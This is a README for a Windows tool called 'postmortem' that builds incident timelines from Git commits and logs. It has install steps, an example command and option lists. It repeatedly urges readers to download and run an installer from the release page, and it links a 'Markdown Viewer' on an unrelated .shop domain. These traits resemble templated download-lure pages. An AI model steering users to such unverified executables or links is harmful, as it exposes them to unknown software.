# ⚙️ postmortem - Build Incident Timelines Quickly

[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)

## 📋 What is postmortem?

postmortem helps you create incident timelines using information from Git and system logs. When issues happen, it can be hard to track what started the problem. This tool brings together changes from your projects and monitoring data into one clear sequence. It works well for teams managing software, services, or websites.

postmortem runs on Windows and uses simple commands to gather data. You don’t need deep technical skills to use it. It can help you find errors, spot trends, and understand how incidents unfold.

## 🖥️ System Requirements

- Windows 10 or later (64-bit)
- Minimum 4 GB RAM
- At least 100 MB free disk space
- Internet connection to download files and access Git repositories
- Git installed on your system (you can get it from https://git-scm.com/download/win)

## 🔧 Key Features

- Combines Git commit history with system and application logs  
- Generates clear timelines showing the order of events  
- Helps identify causes and effects in incidents  
- Supports various log formats common in software projects  
- Runs without needing complex setup or programming knowledge  
- Works with popular DevOps and site reliability tools  
- Can be used from a simple command-line window (Command Prompt or PowerShell)  

## 🚀 Getting Started  

### 1. Visit the download page

Click this large badge to go to the postmortem project page, where you can get the files you need:

[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)  

The page will have the latest release and detailed instructions.

### 2. Download the software

On the GitHub page, look for the **Releases** section. Download the latest Windows installer or ZIP file from there. The file will usually be named something like `postmortem-windows.zip` or `postmortem-setup.exe`.

Save the file someplace easy to find, like your Desktop or Downloads folder.

### 3. Install or unzip the program

- If you downloaded an installer (`.exe`), double-click the file and follow the setup prompts. You can generally accept the default settings.  
- If you downloaded a ZIP file, right-click it and choose **Extract All**. Pick a folder where you want postmortem to live.

### 4. Confirm Git is installed

postmortem depends on Git to pull data from your projects. To check if Git is ready:

- Press the **Windows key**, type `cmd`, and press **Enter** to open Command Prompt  
- Type `git --version` and press **Enter**  
- If it shows a version number, Git is installed. If not, download Git here and install it: https://git-scm.com/download/win  

### 5. Open Command Prompt or PowerShell

- Press the **Windows key**, type `cmd` (for Command Prompt) or `powershell`, and press **Enter**  
- Change the working directory to where you installed or extracted postmortem by typing:  
  `cd C:\path\to\postmortem`  
  Replace `C:\path\to\postmortem` with your actual folder path.  
- You are now ready to use postmortem.

## 📂 How to Run postmortem

postmortem runs from the command line. Here is a simple example to get your first incident timeline.

### Example command

```bash
postmortem --repo "C:\Projects\MyApp" --log "C:\Logs\myapp.log" --output "C:\Reports\timeline.md"
```

This command does the following:

- `--repo`: path to the Git project folder you want to analyze  
- `--log`: path to the log file with system or application events  
- `--output`: path and file name where the incident timeline will be saved  

You can open the output `.md` file with any text editor or Markdown viewer.

## 🔍 Tips for Using postmortem

- Use clear, accessible log files. If your logs are spread across multiple files, merge them into one before using postmortem.  
- Keep your Git repository up to date. Pull the latest changes before running the tool to get accurate timelines.  
- Use meaningful commit messages in Git to understand changes better in timelines.  
- Regularly save the output timeline files with dates to track incidents over time.  

## ⚙️ Configuration Options

postmortem offers several options you can adjust on the command line.

- `--since DATE` – only include commits and logs after this date  
- `--until DATE` – include data up to this date  
- `--verbose` – show detailed progress as the tool runs  
- `--format FORMAT` – set output format (`md` for markdown, `txt` for plain text)  
- `--include-errors` – filter logs to only include error-level messages  

You can combine options to fit your workflow. For a full list, see the documentation on the GitHub page.

## ❓ Troubleshooting

- If the timeline file does not generate, check if paths in the command are correct and if you have read permissions on Git and log folders.  
- Make sure Git is properly installed and accessible from the command line.  
- If you see permission errors during install, run the installer as Administrator.  
- Logs should follow standard formats. If your logs are customized, postmortem may not read them correctly.  

## 🛠️ Advanced Use

postmortem can work with CI/CD systems to automate timeline building after incidents. This requires some scripting and server access. For users interested in this, the GitHub page offers links to examples and API references.

## 📥 Download postmortem here

Use this badge below to return and get the latest files whenever you need:

[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)

## 🔗 Useful Links

- GitHub Repository: https://github.com/xods-id/postmortem  
- Git for Windows Download: https://git-scm.com/download/win  
- Markdown Viewer (optional): https://marknotepad.just-so-so.shop (or any text editor)